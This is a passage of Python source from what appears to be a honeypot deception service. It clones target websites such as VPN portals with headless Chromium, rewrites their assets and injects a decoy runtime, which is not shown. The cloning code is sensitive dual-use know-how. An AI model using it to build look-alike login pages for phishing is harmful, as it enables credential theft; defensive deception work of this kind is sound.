def _internet_system_rows(items: list[InternetSystem]) -> list[dict]:
    rows: list[dict] = []
    for item in items:
        rows.append(
            {
                "id": item.id,
                "name": item.name,
                "domain": item.domain,
                "upstream_url": item.upstream_url,
                "owner": item.owner or "",
                "deploy_mode": item.deploy_mode,
                "status": item.status,
                "status_tone": _internet_system_status_tone(item.status, item.is_enabled),
                "tls_mode": item.tls_mode,
                "failover_mode": item.failover_mode,
                "inject_policy": item.inject_policy,
                "decoy_policy": item.decoy_policy,
                "jsonp_template_key": item.jsonp_template_key or "",
                "risk_policy": item.risk_policy,
                "notes": item.notes or "",
                "tags": item.tags_json or [],
                "is_enabled": item.is_enabled,
                "created_at": item.created_at.strftime("%Y-%m-%d %H:%M")
                if item.created_at
                else "-",
                "updated_at": item.updated_at.strftime("%Y-%m-%d %H:%M")
                if item.updated_at
                else "-",
                "config_preview": _internet_system_config_preview(item),
            }
        )
    return rows


def _build_web_template_payload(
    *,
    web_stack: str,
    entry_path: str,
    deploy_mode: str,
    artifact_name: str,
    artifact_path: str,
    clone_source_url: str = "",
    clone_asset_count: int | None = None,
    clone_total_bytes: int | None = None,
    clone_user_agent: str = "",
    clone_accept_language: str = "",
    clone_render_wait_ms: int | None = None,
) -> list[dict]:
    payload = {
        "type": WEB_TEMPLATE_KIND,
        "web_stack": (web_stack or "Web 页面").strip(),
        "entry_path": _normalize_web_entry_path(entry_path),
        "deploy_mode": (deploy_mode or "静态页面仿真").strip(),
        "artifact_name": artifact_name,
        "artifact_path": artifact_path,
        "enabled": True,
    }
    if clone_source_url:
        payload["clone_source_url"] = clone_source_url
        payload["created_by_clone"] = True
    if clone_asset_count is not None:
        payload["clone_asset_count"] = clone_asset_count
    if clone_total_bytes is not None:
        payload["clone_total_bytes"] = clone_total_bytes
        payload["clone_total_kb"] = clone_total_bytes // 1024
    if clone_user_agent:
        payload["clone_user_agent"] = clone_user_agent
    if clone_accept_language:
        payload["clone_accept_language"] = clone_accept_language
        payload["clone_locale"] = _clone_locale_from_accept_language(clone_accept_language)
    if clone_render_wait_ms is not None:
        payload["clone_render_wait_ms"] = clone_render_wait_ms
    return [payload]


def _normalize_clone_url(value: str) -> str:
    raw = (value or "").strip()
    if not raw:
        raise ValueError("请输入需要克隆的站点 URL")
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", raw):
        host_hint = raw.split("/", 1)[0].lower().strip("[]")
        local_like = (
            host_hint == "localhost"
            or host_hint.startswith("localhost:")
            or host_hint.startswith(("127.", "10.", "192.168.", "172."))
            or host_hint in {"::1"}
        )
        raw = f"{'http' if local_like else 'https'}://{raw}"
    parsed = urlsplit(raw)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("仅支持 http / https 协议的完整站点 URL")
    return raw[:2048]


def _normalize_clone_user_agent(value: str | None = None) -> str:
    raw = (value or "").strip()
    if not raw:
        return CLONE_USER_AGENT
    # Keep the header user-controlled but bounded; this is enough for UA-based
    # language / desktop-mobile negotiation without allowing giant headers.
    return raw.replace("\r", " ").replace("\n", " ")[:500]


def _normalize_clone_accept_language(value: str | None = None) -> str:
    raw = (value or "").strip() or CLONE_ACCEPT_LANGUAGE
    safe = re.sub(r"[^A-Za-z0-9,;=_.\- ]", "", raw).strip()
    return (safe or CLONE_ACCEPT_LANGUAGE)[:180]


def _clone_locale_from_accept_language(accept_language: str) -> str:
    first = (accept_language or CLONE_ACCEPT_LANGUAGE).split(",", 1)[0].split(";", 1)[0].strip()
    if not first:
        return "zh-CN"
    if first.lower().startswith("zh"):
        return "zh-CN" if "tw" not in first.lower() and "hk" not in first.lower() else "zh-TW"
    return first[:32]


def _normalize_clone_render_wait_ms(value: int | str | None = None) -> int:
    try:
        raw = int(value) if value not in (None, "") else 6
    except (TypeError, ValueError):
        raw = 6
    if raw > 1000:
        return max(2000, min(20000, raw))
    return max(2, min(20, raw)) * 1000


def _safe_clone_slug(value: str) -> str:
    safe = "".join(ch if ch.isalnum() or ch in "._-" else "-" for ch in (value or ""))
    safe = safe.strip(".-_")
    return safe[:80] or f"site-{secrets.token_hex(3)}"


def _project_relative_path(path: Path) -> str:
    try:
        return str(path.relative_to(PROJECT_ROOT))
    except ValueError:
        return str(path)


def _clone_headers(user_agent: str, accept_language: str, *, html: bool = True) -> dict[str, str]:
    headers = {
        "User-Agent": user_agent,
        "Accept-Language": accept_language,
        "Referer": "",
    }
    if html:
        headers["Accept"] = (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        )
        headers["Upgrade-Insecure-Requests"] = "1"
    else:
        headers["Accept"] = "*/*"
    return {k: v for k, v in headers.items() if v}


_BASE_TAG_RE = re.compile(
    r"<base\b[^>]*?\shref\s*=\s*[\"'][^\"']*[\"'][^>]*>",
    re.IGNORECASE,
)


def _remove_base_tag(html: str) -> str:
    """Remove any ``<base href="...">`` tag from the cloned HTML.

    The original site sets ``<base href>`` to its own root, which makes the
    browser resolve every relative URL against the original server even when
    we have rewritten them to local clone assets. Dropping the tag forces
    the browser to resolve against the clone server's mount path.
    """
    if not html:
        return html
    return _BASE_TAG_RE.sub("", html)


_EMPTY_SCRIPT_RE = re.compile(
    r"<script\b([^>]*)>\s*</script>",
    re.IGNORECASE,
)


def _restore_script_srcs(
    html: str,
    original_srcs: list[str],
    assets_map: dict[str, str] | None = None,
    base_url: str = "",
) -> str:
    """Re-attach ``src`` attributes that Chromium stripped during DOM serialization.

    ``page.content()`` returns HTML where previously-executed <script> tags
    have no ``src`` (Chromium treats them as live, not part of static markup).
    After _disable_original_scripts() runs in _inject_clone_runtime(), the
    <script> tags are still there but blank. We walk the empty <script> tags
    in order and re-inject the corresponding src from the captured list,
    rewriting through ``assets_map`` so the URL points to a local asset.

    The lookup uses the same _rewrite_clone_text machinery that the rest of
    the clone pipeline uses — each captured src string is rewritten through
    the full variant table so path-level variation (relative, protocol-relative,
    or absolute) is automatically covered.
    """
    if not html or not original_srcs:
        return html

    # Build a lookup table: src -> local asset name (via variant rewriting).
    src_to_local: dict[str, str] = {}
    for src in original_srcs:
        local = _rewrite_clone_text(src, base_url, assets_map, conservative=False)
        # _rewrite_clone_text may return the original if nothing matched —
        # in that case keep the src as-is so we don't break the page.
        src_to_local[src] = local if local != src or local.endswith((".js", ".css")) else src

    src_iter = iter(original_srcs)

    def _repl(m: "re.Match[str]") -> str:
        try:
            src = next(src_iter)
        except StopIteration:
            return m.group(0)
        if not src:
            return m.group(0)
        local = src_to_local.get(src, src)
        attrs = m.group(1) or ""
        # Strip any existing src= (shouldn't exist, but defensive) and append.
        attrs = re.sub(r"\ssrc\s*=\s*[\"'][^\"']*[\"']", "", attrs, flags=re.IGNORECASE)
        return f'<script{attrs} src="{local}"></script>'

    return _EMPTY_SCRIPT_RE.sub(_repl, html)


def _clone_reference_variants(asset_url: str, base_url: str) -> list[str]:
    parsed = urlsplit(asset_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        return []
    path = parsed.path or "/"
    path_query = path + (f"?{parsed.query}" if parsed.query else "")
    variants = {
        asset_url,
        f"//{parsed.netloc}{path_query}",
        path_query,
        path,
    }

    base = urlsplit(base_url)
    base_path = base.path or "/"
    base_dir = base_path.rsplit("/", 1)[0] + "/" if "/" in base_path else "/"
    if parsed.netloc == base.netloc:
        rel_path = path.lstrip("/")
        variants.add(rel_path + (f"?{parsed.query}" if parsed.query else ""))
        variants.add(rel_path)
        try:
            rel_from_file = posixpath.relpath(path, base_dir)
        except ValueError:
            rel_from_file = ""
        if rel_from_file and not rel_from_file.startswith("../../../../"):
            if rel_from_file not in {".", "..", "./", "../"}:
                variants.add(rel_from_file + (f"?{parsed.query}" if parsed.query else ""))
                variants.add(rel_from_file)
                variants.add(f"./{rel_from_file}" + (f"?{parsed.query}" if parsed.query else ""))
                variants.add(f"./{rel_from_file}")
        if path.startswith(base_dir):
            rel_from_base = path[len(base_dir) :]
            variants.add(rel_from_base + (f"?{parsed.query}" if parsed.query else ""))
            variants.add(rel_from_base)
            variants.add(f"./{rel_from_base}" + (f"?{parsed.query}" if parsed.query else ""))
            variants.add(f"./{rel_from_base}")

    # Extract the last path segment (filename) — used to reject overly generic variants.
    filename = path.rsplit("/", 1)[-1].split("?")[0].split("#")[0] if path else ""

    # Generate `../`-prefixed variants. CSS files (and inline-style blocks)
    # commonly reference images via paths like `../../images/foo.png` that
    # originated from a deeper folder than the cloned base URL. Generating
    # several layers of leading `../` covers this without re-introducing
    # the bare-number over-match risk (these variants carry a real filename).
    extra_dots: set[str] = set()
    rel_from_file_str = rel_from_file if "rel_from_file" in locals() else ""
    for candidate in (
        path,
        path.lstrip("/"),
        rel_from_file_str,
    ):
        if not candidate or candidate.startswith("/"):
            continue
        for depth in range(1, 5):
            prefix = "../" * depth
            if not candidate.startswith(prefix):
                extra_dots.add(prefix + candidate)
                extra_dots.add(prefix + candidate + (f"?{parsed.query}" if parsed.query else ""))
    variants.update(extra_dots)

    expanded: set[str] = set()
    for variant in variants:
        if not variant or variant in {"/", "./", ".", "./.", "..", "../"} or len(variant) < 3:
            continue
        # Reject variants whose last segment is a bare number or very short generic token
        # (e.g. "/assets/1" → last segment "1" would corrupt "100%" in CSS,
        #  "/css" → last segment "css" would corrupt "text/css" in HTML).
        last_seg = variant.rsplit("/", 1)[-1].split("?")[0].split("#")[0].lstrip("./")
        if last_seg.isdigit() or (
            len(last_seg) <= 3 and last_seg not in {"js", "css", "ui", "v1", "v2"}
        ):
            continue
        # Reject if the variant is a single bare short token with no path prefix
        # (e.g. "css", "img", "lib") because these match too aggressively inside
        # HTML attributes like type="text/css", rel="stylesheet", etc.
        if "/" not in variant and len(last_seg) <= 4 and not variant.startswith(("http", "//")):
            continue
        # Reject if the filename itself is a bare number (e.g. URL /assets/1)
        if filename and filename.replace(".", "").replace("-", "").isdigit() and len(filename) < 4:
            # Only keep the full absolute URL variant for numeric filenames,
            # skip all relative/path-only variants that could match bare numbers.
            if variant != asset_url and not variant.startswith("//"):
                continue
        expanded.add(variant)
        expanded.add(variant.replace("&", "&amp;"))
        if "/" in variant:
            expanded.add(variant.replace("/", r"\/"))
    return sorted(expanded, key=len, reverse=True)


def _rewrite_clone_text(
    text: str,
    base_url: str,
    assets_map: dict[str, str],
    *,
    conservative: bool = False,
) -> str:
    """Replace original-site asset references with the local clone filename.

    When ``conservative`` is True (used for JS / JSON / SVG assets), only the
    asset's full URL form and the protocol-relative ``//host/path`` form are
    matched. This protects JS comments and string literals that happen to
    share tokens with a real asset path (e.g. ``jquery.base64.js`` in a
    comment header) from being mangled.

    Replacement uses word-boundary anchoring on both sides so that
    ``css/settings.css`` does not match inside ``rs-plugin/css/settings.css``.
    Without anchoring, ``re.sub`` would happily rewrite the suffix and
    produce ``rs-plugin/asset-0041.css``.
    """
    rewritten = text
    if conservative:
        for asset_url, local_name in sorted(
            assets_map.items(), key=lambda item: len(item[0]), reverse=True
        ):
            parsed = urlsplit(asset_url)
            if parsed.scheme not in ("http", "https"):
                continue
            path_query = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
            for variant in (asset_url, f"//{parsed.netloc}{path_query}", path_query):
                pattern = _boundary_regex(variant)
                rewritten = pattern.sub(local_name.replace("\\", r"\\"), rewritten)
    else:
        for asset_url, local_name in sorted(
            assets_map.items(), key=lambda item: len(item[0]), reverse=True
        ):
            for variant in _clone_reference_variants(asset_url, base_url):
                pattern = _boundary_regex(variant)
                rewritten = pattern.sub(local_name.replace("\\", r"\\"), rewritten)
    # After replacement, leftover `../` or `./` segments may have been glued
    # to a local asset name (e.g. `../../..asset-0003.png`). Strip any leading
    # `../` and `./` chains that sit directly before `asset-`.
    rewritten = re.sub(r"(?:\.{1,2}/)+(?=asset-)", "", rewritten)
    return rewritten


_BOUNDARY_PATTERN_CACHE: dict[str, "re.Pattern[str]"] = {}


def _boundary_regex(variant: str) -> "re.Pattern[str]":
    """Compile a regex that matches ``variant`` only when surrounded by boundaries.

    Boundaries are: start/end of string, whitespace, or one of the URL/CSS
    separator characters that cannot legally appear inside a single URL token
    (so we don't match inside an unrelated token but DO match across quoted
    CSS @import paths, JS string literals, and HTML attribute quotes).
    """
    cached = _BOUNDARY_PATTERN_CACHE.get(variant)
    if cached is not None:
        return cached
    escaped = re.escape(variant)
    pattern = re.compile(r"(?:^|(?<=[\s\"'`>]))" + escaped + r"(?:$|(?=[\s\"'`<]))")
    _BOUNDARY_PATTERN_CACHE[variant] = pattern
    return pattern


# Matches relative asset references in HTML attributes: src/href/poster/data-src
# values that start with ./ ../ or a plain directory segment (images/..., theme/...).
_CLONE_HTML_REL_ATTR_RE = re.compile(
    r"""(?P<attr>\b(?:src|href|poster|data-src)\s*=\s*)(?P<quote>["'])(?P<url>(?:\.{1,2}/|(?:[A-Za-z0-9_\-]+/)+)[^"'<>\s]+)(?P=quote)""",
    re.IGNORECASE,
)


def _clone_base_candidates(base_urls: list[str]) -> list[str]:
    """Expand page URLs into base candidates, adding a trailing-slash form for
    extension-less paths so `./x` resolves both against `/portal` and `/portal/`
    (servers commonly 301 from one to the other)."""
    candidates: list[str] = []
    for url in base_urls:
        if not url:
            continue
        candidates.append(url)
        parsed = urlsplit(url)
        last = (parsed.path or "").rsplit("/", 1)[-1]
        if last and "." not in last and not parsed.path.endswith("/"):
            candidates.append(urlunsplit((parsed.scheme, parsed.netloc, parsed.path + "/", "", "")))
    return candidates


def _rewrite_unresolved_clone_refs(
    html: str, base_urls: list[str], assets_map: dict[str, str]
) -> str:
    """Rewrite leftover relative asset references the variant pass could not catch.

    The variant pass only matches references that look like one of the forms it
    generated. Pages reached through JS redirects (e.g. a VPN portal bounce)
    keep their original relative hrefs (``./index.css``, ``images/logo.png``),
    which only resolve correctly against the *final* document URL — and that URL
    may or may not carry a trailing slash. This pass resolves every remaining
    relative reference against all candidate bases and rewrites it only when the
    resolved absolute URL is a captured asset, so false positives are impossible.
    """
    bases = _clone_base_candidates(base_urls)
    if not bases or not assets_map:
        return html

    def _resolve(raw: str) -> str | None:
        for base in bases:
            resolved = urljoin(base, raw)
            if resolved in assets_map:
                return assets_map[resolved]
        return None

    def _attr_repl(m: "re.Match") -> str:
        raw = m.group("url").strip()
        if not _is_clone_candidate_url(raw):
            return m.group(0)
        local = _resolve(raw)
        if not local:
            return m.group(0)
        return f"{m.group('attr')}{m.group('quote')}{local}{m.group('quote')}"

    rewritten = _CLONE_HTML_REL_ATTR_RE.sub(_attr_repl, html)

    def _css_repl(m: "re.Match") -> str:
        raw = m.group("url").strip()
        if not _is_clone_candidate_url(raw) or raw.startswith(("/", "http://", "https://", "//")):
            return m.group(0)
        local = _resolve(raw)
        if not local:
            return m.group(0)
        return f"url({m.group('quote') or ''}{local}{m.group('quote') or ''})"

    rewritten = CLONE_CSS_URL_RE.sub(_css_repl, rewritten)
    return rewritten


def _is_clone_text_asset(content_type: str, local_name: str) -> bool:
    ct = (content_type or "").split(";", 1)[0].strip().lower()
    if ct.startswith("text/"):
        return True
    if ct in {
        "application/javascript",
        "application/x-javascript",
        "application/json",
        "application/xml",
        "image/svg+xml",
    }:
        return True
    return Path(local_name).suffix.lower() in {
        ".js",
        ".css",
        ".json",
        ".html",
        ".htm",
        ".svg",
        ".xml",
        ".txt",
    }


CLONE_STATIC_STRING_RE = re.compile(
    r"""(?P<quote>["'`])(?P<url>(?:https?://|//|/|\.{1,2}/)?[^"'`\\\s<>]+\.(?:png|jpe?g|gif|svg|webp|ico|bmp|avif|css|js|woff2?|ttf|eot)(?:\?[^"'`\s<>]*)?)(?P=quote)""",
    re.IGNORECASE,
)


def _is_clone_candidate_url(value: str) -> bool:
    raw = (value or "").strip()
    if not raw or raw.startswith("#"):
        return False
    lower = raw.lower()
    if lower.startswith(("data:", "blob:", "javascript:", "mailto:", "tel:", "about:")):
        return False
    return True


def _extract_clone_asset_urls(base_url: str, text: str) -> list[str]:
    urls: list[str] = []
    for m in CLONE_CSS_URL_RE.finditer(text or ""):
        raw = m.group("url").strip()
        if _is_clone_candidate_url(raw):
            urls.append(urljoin(base_url, raw))
    for m in CLONE_STATIC_STRING_RE.finditer(text or ""):
        raw = m.group("url").strip()
        if _is_clone_candidate_url(raw):
            urls.append(urljoin(base_url, raw))
    for m in CLONE_PARAM_VALUE_RE.finditer(text or ""):
        raw = m.group("url").strip()
        if _is_clone_candidate_url(raw):
            urls.append(urljoin(base_url, raw))

    deduped: list[str] = []
    seen: set[str] = set()
    for url in urls:
        parsed = urlsplit(url)
        if parsed.scheme not in ("http", "https") or url in seen:
            continue
        seen.add(url)
        deduped.append(url)
    return deduped


def _fetch_clone_asset(
    url: str, *, user_agent: str, accept_language: str, referer: str = "", timeout: int = 0
) -> tuple[bytes, str] | None:
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    headers = _clone_headers(user_agent, accept_language, html=False)
    if referer:
        headers["Referer"] = referer
    try:
        req = UrlRequest(url, headers=headers)
        with urlopen(req, timeout=timeout or CLONE_URL_TIMEOUT, context=ssl_ctx) as resp:
            data = resp.read(CLONE_MAX_ASSET_BYTES + 1)
            if len(data) > CLONE_MAX_ASSET_BYTES:
                return None
            return data, resp.headers.get("Content-Type", "")
    except Exception:
        return None


def _complete_clone_asset_graph(
    captured_assets: dict[str, dict],
    *,
    user_agent: str,
    accept_language: str,
) -> None:
    """Recursively fetch CSS/JS referenced images/fonts not requested during first render.

    Hard limits: at most 200 nested fetches total, 6s per fetch, 90s wall-clock total.
    """
    import time

    MAX_NESTED = 200
    FETCH_TIMEOUT = 6
    WALL_DEADLINE = time.monotonic() + 90

    queue = list(captured_assets.keys())
    seen = set(queue)
    cursor = 0
    nested_count = 0
    while cursor < len(queue) and len(captured_assets) < CLONE_MAX_ASSETS:
        if nested_count >= MAX_NESTED:
            break
        if time.monotonic() > WALL_DEADLINE:
            break
        base_url = queue[cursor]
        cursor += 1
        meta = captured_assets.get(base_url) or {}
        local_name_hint = _guess_asset_ext(base_url, meta.get("content_type", ""))
        if not _is_clone_text_asset(meta.get("content_type", ""), f"x{local_name_hint}"):
            continue
        text = (meta.get("body") or b"").decode("utf-8", errors="replace")
        for nested_url in _extract_clone_asset_urls(base_url, text):
            if nested_url in seen or len(captured_assets) >= CLONE_MAX_ASSETS:
                continue
            if nested_count >= MAX_NESTED or time.monotonic() > WALL_DEADLINE:
                break
            seen.add(nested_url)
            nested_count += 1
            fetched = _fetch_clone_asset(
                nested_url,
                user_agent=user_agent,
                accept_language=accept_language,
                referer=base_url,
                timeout=FETCH_TIMEOUT,
            )
            if not fetched:
                continue
            body, content_type = fetched
            captured_assets[nested_url] = {
                "body": body,
                "content_type": content_type,
                "resource_type": "nested",
            }
            queue.append(nested_url)


def _clone_remote_site(
    clone_url: str,
    *,
    user_agent: str | None = None,
    accept_language: str | None = None,
    render_wait_ms: int | str | None = None,
    _progress: "Callable | None" = None,
    inject_kwargs: dict | None = None,
    dismiss_modals: bool = False,
) -> tuple[str, list[dict], int]:
    """Fetch *clone_url* and save HTML + assets under CLONED_TEMPLATE_ROOT.

    Strategy:
      1. Playwright headless Chromium with zh-CN locale and custom UA headers.
      2. wget -k -p -l 2 -H with the same headers.
      3. urllib + enhanced regex fallback.

    ``_progress(stage, percent)`` is called at key milestones when provided.
    ``inject_kwargs`` is forwarded to ``_inject_clone_runtime``.
    Returns ``(stored_path, assets_summary, total_bytes)``.
    """
    inject_kwargs = inject_kwargs or {}

    def _pct(stage: str, percent: int) -> None:
        if _progress:
            _progress(stage, percent)

    _pct("准备参数…", 5)
    clone_url = _normalize_clone_url(clone_url)
    ua = _normalize_clone_user_agent(user_agent)
    lang = _normalize_clone_accept_language(accept_language)
    wait_ms = _normalize_clone_render_wait_ms(render_wait_ms)
    parsed = urlsplit(clone_url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("仅支持 http / https 协议的 URL")
    domain = parsed.netloc.split("@")[-1].split(":")[0].lower()
    if not domain:
        raise ValueError("无法解析目标域名")

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    clone_dir = CLONED_TEMPLATE_ROOT / f"{stamp}-{secrets.token_hex(4)}-{_safe_clone_slug(domain)}"
    clone_dir.mkdir(parents=True, exist_ok=True)
    index_path = clone_dir / "index.html"

    # Pass source_url into inject_kwargs so the runtime knows the original URL.
    inject_kwargs.setdefault("source_url", clone_url)

    try:
        _pct("启动浏览器…", 12)
        result = _clone_with_playwright(
            clone_url,
            clone_dir,
            user_agent=ua,
            accept_language=lang,
            render_wait_ms=wait_ms,
            _progress=_pct,
            inject_kwargs=inject_kwargs,
            dismiss_modals=dismiss_modals,
        )
        _pct("注入蜜罐运行时…", 88)
        return result
    except Exception as exc:
        import logging

        logging.getLogger("honeypot_services").warning("Playwright clone failed: %s", exc)

    _pct("尝试 wget 下载…", 50)
    summaries: list[dict] = []
    total_bytes = 0
    try:
        summaries, total_bytes = _clone_with_wget(
            clone_url, clone_dir, user_agent=ua, accept_language=lang
        )
    except Exception:
        pass
    if index_path.is_file() and index_path.stat().st_size > 100:
        _pct("完成", 100)
        # Inject runtime into the wget-fetched HTML too.
        try:
            html = index_path.read_text(encoding="utf-8", errors="replace")
            html = _inject_clone_runtime(html, **inject_kwargs)
            index_path.write_text(html, encoding="utf-8")
        except Exception:
            pass
        return _project_relative_path(index_path), summaries, total_bytes

    _pct("回退 urllib 抓取…", 70)
    result = _clone_with_urllib(
        clone_url, clone_dir, user_agent=ua, accept_language=lang, inject_kwargs=inject_kwargs
    )
    return result


def _dismiss_open_modals(page) -> None:
    """Close modal dialogs / overlays the site opened during page load.

    A clone must capture the pristine landing state; a modal frozen open
    (client-detection dialogs, cookie banners, welcome overlays) makes the
    clone obviously different from a fresh visit. Strategy: Escape first,
    then common close controls, then remove still-visible overlay nodes.
    """
    try:
        page.keyboard.press("Escape")
        page.wait_for_timeout(250)
    except Exception:
        pass
    close_selectors = [
        "[class*='modal'] [class*='close']",
        "[class*='dialog'] [class*='close']",
        "[class*='modal'] button[aria-label*='close' i]",
        "[class*='dialog'] button[aria-label*='close' i]",
        ".el-dialog__close", ".el-message-box__close", ".ant-modal-close",
        ".layui-layer-close", "[data-dismiss='modal']",
        "button.close", ".modal .close", ".popup .close",
    ]
    for sel in close_selectors:
        try:
            for el in page.query_selector_all(sel):
                try:
                    if el.is_visible():
                        el.click(timeout=400)
                        page.wait_for_timeout(120)
                except Exception:
                    pass
        except Exception:
            pass
    # Last resort: hide remaining fixed/absolute dialog containers. Some
    # frameworks (avalon etc.) render dialogs at low z-index (z≈13) and toggle
    # them via data attributes, so class- and data-attribute matching carries
    # the detection while the size/position guard avoids nuking page chrome.
    try:
        page.evaluate(
            """() => {
              const gone = [];
              document.querySelectorAll('.dialog, [class*="dialog"], [class*="modal"], [data-dialog-ctr]').forEach((el) => {
                const cs = getComputedStyle(el);
                if ((cs.position === 'fixed' || cs.position === 'absolute') && cs.display !== 'none'
                    && el.offsetWidth > 200 && el.offsetHeight > 120) {
                  el.style.setProperty('display', 'none', 'important');
                  gone.push(el.className || el.id || el.tagName);
                }
              });
              document.querySelectorAll('[class*="modal-backdrop"], [class*="mask"], [class*="overlay"]').forEach((el) => {
                const cs = getComputedStyle(el);
                if (cs.position === 'fixed' && el.offsetWidth >= window.innerWidth * 0.9) {
                  el.style.setProperty('display', 'none', 'important');
                }
              });
              document.body.style.overflow = '';
              document.documentElement.style.overflow = '';
              return gone;
            }"""
        )
    except Exception:
        pass


def _clone_with_playwright(
    clone_url: str,
    clone_dir: Path,
    *,
    user_agent: str,
    accept_language: str,
    render_wait_ms: int,
    _progress: "Callable | None" = None,
    inject_kwargs: dict | None = None,
    dismiss_modals: bool = False,
) -> tuple[str, list[dict], int]:
    """Clone using Playwright headless Chromium — renders JS / SPA content."""
    from playwright.sync_api import sync_playwright

    inject_kwargs = inject_kwargs or {}

    def _pct(stage: str, percent: int) -> None:
        if _progress:
            _progress(stage, percent)

    locale = _clone_locale_from_accept_language(accept_language)
    captured_assets: dict[str, dict] = {}

    _pct("启动浏览器…", 15)
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = browser.new_context(
            user_agent=user_agent,
            locale=locale,
            timezone_id="Asia/Shanghai",
            viewport={"width": 1440, "height": 900},
            ignore_https_errors=True,
            extra_http_headers={"Accept-Language": accept_language},
        )
        languages = [locale]
        if locale.lower().startswith("zh"):
            languages = [locale, "zh-CN", "zh", "en-US", "en"]
        context.add_init_script(
            f"""
            (() => {{
              const language = {json.dumps(locale)};
              const languages = {json.dumps(languages, ensure_ascii=False)};
              try {{
                Object.defineProperty(navigator, 'language', {{ get: () => language }});
                Object.defineProperty(navigator, 'languages', {{ get: () => languages }});
                const candidates = ['language', 'lang', 'locale', 'i18nextLng', 'NG_TRANSLATE_LANG_KEY'];
                for (const key of candidates) localStorage.setItem(key, language);
              }} catch (e) {{}}
            }})();
            """
        )
        page = context.new_page()

        def _on_response(response):
            try:
                if response.status != 200 or len(captured_assets) >= CLONE_MAX_ASSETS:
                    return
                url = response.url
                if not url.startswith(("http://", "https://")) or url in captured_assets:
                    return
                request_type = response.request.resource_type
                ct = response.headers.get("content-type", "")
                # Capture favicons (resource_type "media" or "image", or .ico URL).
                is_favicon = "/favicon" in url.lower() or url.lower().endswith(".ico")
                if request_type == "document" and not is_favicon:
                    return
                wanted = (
                    is_favicon
                    or request_type
                    in {"script", "stylesheet", "image", "font", "media", "object", "other"}
                    or any(
                        token in ct
                        for token in (
                            "text/css",
                            "javascript",
                            "image/",
                            "font/",
                            "application/json",
                            "text/html",
                            "image/svg",
                            "application/x-shockwave-flash",
                            "application/octet-stream",
                        )
                    )
                )
                if not wanted:
                    return
                body = response.body()
                if len(body) > CLONE_MAX_ASSET_BYTES:
                    return
                captured_assets[url] = {
                    "body": body,
                    "content_type": ct,
                    "resource_type": request_type,
                }
                # Update progress based on asset count
                _pct(
                    f"捕获资源中（{len(captured_assets)} 个）…",
                    min(15 + len(captured_assets) // 5, 55),
                )
            except Exception:
                pass

        page.on("response", _on_response)
        _pct("加载页面…", 20)
        page.goto(clone_url, wait_until="domcontentloaded", timeout=30000)
        try:
            page.wait_for_load_state("networkidle", timeout=15000)
        except Exception:
            pass
        _pct(f"等待渲染（{render_wait_ms // 1000}s）…", 40)
        page.wait_for_timeout(render_wait_ms)

        # Explicitly fetch favicon via Playwright's API request context (doesn't
        # navigate away from the page, unlike page.goto).
        try:
            parsed_orig = urlsplit(clone_url)
            favicon_url = f"{parsed_orig.scheme}://{parsed_orig.netloc}/favicon.ico"
            if favicon_url not in captured_assets:
                fav_resp = context.request.get(favicon_url, timeout=5000)
                if fav_resp.ok:
                    fav_body = fav_resp.body()
                    if fav_body and len(fav_body) < CLONE_MAX_ASSET_BYTES:
                        captured_assets[favicon_url] = {
                            "body": fav_body,
                            "content_type": fav_resp.headers.get("content-type", "image/x-icon"),
                            "resource_type": "favicon",
                        }
        except Exception as exc:
            import logging

            logging.getLogger("honeypot_services").debug(
                "favicon fetch via playwright failed: %s", exc
            )
            # Fallback: use urllib to download favicon directly.
            try:
                parsed_orig = urlsplit(clone_url)
                favicon_url = f"{parsed_orig.scheme}://{parsed_orig.netloc}/favicon.ico"
                if favicon_url not in captured_assets:
                    fetched = _fetch_clone_asset(
                        favicon_url,
                        user_agent=user_agent,
                        accept_language=accept_language,
                        timeout=5,
                    )
                    if fetched:
                        body, ct = fetched
                        captured_assets[favicon_url] = {
                            "body": body,
                            "content_type": ct,
                            "resource_type": "favicon",
                        }
            except Exception:
                pass

        try:
            page.evaluate(
                """
                async () => {
                  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
                  const maxY = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
                  for (const y of [0, maxY * 0.35, maxY * 0.7, maxY]) {
                    window.scrollTo(0, y);
                    await sleep(250);
                  }
                  window.scrollTo(0, 0);
                }
                """
            )
            page.wait_for_timeout(500)
        except Exception:
            pass

        # Chromium's DOM serialization strips `src` from already-executed
        # <script> tags. Capture the original src values via JS so we can
        # re-inject them after rewriting.
        try:
            original_script_srcs = page.evaluate(
                "() => Array.from(document.querySelectorAll('script[src]'))"
                ".map(s => s.getAttribute('src') || '')"
                ".filter(s => s)"
            )
        except Exception:
            original_script_srcs = []

        # Opt-in: dismiss modal dialogs / overlays the site opened during load.
        # Default OFF — the authentic page state (client-download prompts etc.)
        # is part of the 1:1 deception; only enable for pristine snapshots.
        if dismiss_modals:
            try:
                _dismiss_open_modals(page)
                page.wait_for_timeout(300)
            except Exception:
                pass

        html = page.content()
        # The rendered document may sit at a different URL than the requested
        # one (JS/meta redirects such as VPN portal bounces). Relative asset
        # references must be resolved against this final URL.
        final_page_url = page.url or clone_url
        browser.close()

    if len(html) < 100:
        raise ValueError("页面内容过少，Playwright 克隆失败")

    _pct(f"补充嵌套资源（已捕获 {len(captured_assets)} 个）…", 58)
    _complete_clone_asset_graph(
        captured_assets,
        user_agent=user_agent,
        accept_language=accept_language,
    )

    assets_map: dict[str, str] = {}
    for idx, (url, meta) in enumerate(captured_assets.items()):
        ext = _guess_asset_ext(url, meta.get("content_type", ""))
        assets_map[url] = f"asset-{idx:04d}-{hashlib.md5(url.encode()).hexdigest()[:10]}{ext}"

    summaries: list[dict] = []
    total_bytes = 0
    total_assets = len(captured_assets)
    for url, meta in captured_assets.items():
        local_name = assets_map[url]
        body = meta["body"]
        ct = meta.get("content_type", "")
        if _is_clone_text_asset(ct, local_name):
            # JS / JSON / SVG often contain URL-shaped strings inside comments
            # or JSON literals; restrict replacements to full URL forms so we
            # do not corrupt the surrounding code.
